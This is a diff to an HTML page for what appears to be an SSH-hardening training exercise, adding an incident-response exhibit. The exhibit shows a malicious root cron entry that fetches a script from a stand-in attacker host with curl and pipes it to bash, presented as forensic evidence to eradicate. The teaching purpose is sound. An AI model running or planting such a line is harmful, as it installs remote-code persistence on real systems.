@@ -59,6 +59,14 @@
         </p>
       </header>
 
+      <figure class="pbq-ssh-exhibit" aria-labelledby="ubuntu-cron-exhibit">
+        <p id="ubuntu-intro-ubuntu-cron-exhibit" class="pbq-ssh-exhibit__banner">IR ticket excerpt — attacker persistence (forensics)</p>
+        <div class="pbq-ssh-exhibit__body">
+          <pre class="pbq-ssh-cron-line"><code>*/5 * * * * root curl -s http://malicious.example/payload.sh | bash</code></pre>
+          <p class="pbq-ssh-exhibit__note">Malicious cron entry found in <code>/etc/cron.d/</code> — eradication still required after SSH hardening.</p>
+        </div>
+      </figure>
+
       <div class="pbq-ssh-score-row" aria-label="Section scores">
         <span class="pbq-ssh-score" id="ubuntu-intro-score-sshd">sshd_config <strong>0</strong> / 7 pts</span>
         <span class="pbq-ssh-score" id="ubuntu-intro-score-f2b">fail2ban <strong>0</strong> / 4 pts</span>
